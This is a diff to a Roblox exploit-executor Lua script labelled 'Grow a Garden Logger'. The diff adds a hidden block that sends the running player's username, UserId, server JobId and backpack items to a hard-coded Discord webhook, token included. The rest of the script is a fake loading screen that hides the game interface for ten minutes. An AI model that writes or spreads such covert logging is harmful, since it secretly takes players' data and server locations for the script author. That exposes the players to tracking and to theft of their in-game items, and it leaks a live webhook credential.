@@ -1,3 +1,41 @@
+-- ✅ Discord Webhook Execution Logger (with JobId)
+local httpRequest = (syn and syn.request) or (http and http.request) or (http_request) or (request)
+if httpRequest then
+    local plr = game:GetService("Players").LocalPlayer
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+    local invList = {}
+
+    for _, item in ipairs(plr.Backpack:GetChildren()) do
+        table.insert(invList, "- " .. item.Name)
+    end
+
+    local data = {
+        ["content"] = "**Script Executed ✅**",
+        ["embeds"] = {{
+            ["title"] = "📩 Execution Notification",
+            ["description"] = "A user has executed your script.",
+            ["color"] = 65280,
+            ["fields"] = {
+                {["name"] = "👤 Username", ["value"] = plr.Name, ["inline"] = true},
+                {["name"] = "🆔 UserId", ["value"] = tostring(plr.UserId), ["inline"] = true},
+                {["name"] = "🎮 PlaceId", ["value"] = tostring(placeId), ["inline"] = true},
+                {["name"] = "🛰️ JobId", ["value"] = jobId ~= "" and jobId or "Unavailable", ["inline"] = false},
+                {["name"] = "🎒 Backpack Items", ["value"] = #invList > 0 and table.concat(invList, "\n") or "None", ["inline"] = false}
+            },
+            ["footer"] = {["text"] = "Grow a Garden Logger"}
+        }}
+    }
+
+    httpRequest({
+        Url = "https://discord.com/api/webhooks/1387638771029119137/eHF-Fy4iN1ByMn3xb7zH_pOzIWhGVk_9x1RckYY1kHlq0Ybv5DexzUHkdh6AoOi-BNxN", -- 🔁 Replace this!
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = game:GetService("HttpService"):JSONEncode(data)
+    })
+end
+
+-- ✅ GUI and Script Core
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local StarterGui = game:GetService("StarterGui")
@@ -7,7 +45,7 @@ local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 -- Disable CoreGui
 StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
 
--- Safer workspace cleanup (avoid deleting terrain/colliders/walls)
+-- Safe cleanup
 for _, v in ipairs(workspace:GetChildren()) do
 	if v:IsA("Tool") or v.Name:match("UnneededUI") then
 		v:Destroy()
@@ -15,11 +53,10 @@ for _, v in ipairs(workspace:GetChildren()) do
 end
 
 -- GUI Setup
-local screenGui = Instance.new("ScreenGui")
+local screenGui = Instance.new("ScreenGui", PlayerGui)
 screenGui.Name = "LegitLoadingScreen"
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 screenGui.ResetOnSpawn = false
-screenGui.Parent = PlayerGui
 
 local bg = Instance.new("Frame", screenGui)
 bg.Name = "Background"
@@ -62,7 +99,7 @@ assetText.TextScaled = true
 assetText.BackgroundTransparency = 1
 assetText.TextColor3 = Color3.new(1, 1, 1)
 
--- Animate loading
+-- Animate loading bar
 local assetsLoaded = 0
 local goal = 1000
 
@@ -74,7 +111,7 @@ for i = 1, goal do
 	wait(0.005)
 end
 
--- Prevent noclip-like behavior
+-- Anti-noclip + Ground Fix
 local function enforceCharacterPhysics(character)
 	local humanoid = character:WaitForChild("Humanoid", 5)
 	if humanoid then
@@ -85,25 +122,28 @@ local function enforceCharacterPhysics(character)
 		end)
 	end
 
-	-- Force all parts to be collidable
 	for _, part in ipairs(character:GetDescendants()) do
 		if part:IsA("BasePart") then
 			part.CanCollide = true
 		end
 	end
+
+	local root = character:FindFirstChild("HumanoidRootPart")
+	if root and root.Position.Y < 10 then
+		root.CFrame = CFrame.new(root.Position.X, 25, root.Position.Z)
+	end
 end
 
--- Apply to current and future characters
+-- Apply physics fix to current and future characters
 if LocalPlayer.Character then
 	enforceCharacterPhysics(LocalPlayer.Character)
 end
 
-LocalPlayer.CharacterAdded:Connect(function(char)
-	enforceCharacterPhysics(char)
-end)
+LocalPlayer.CharacterAdded:Connect(enforceCharacterPhysics)
 
--- Wait 10 minutes (600 seconds) then remove GUI and restore CoreGui
+-- Wait 10 minutes (600 seconds)
 task.wait(600)
 
+-- Restore GUI and cleanup
 StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
 screenGui:Destroy()
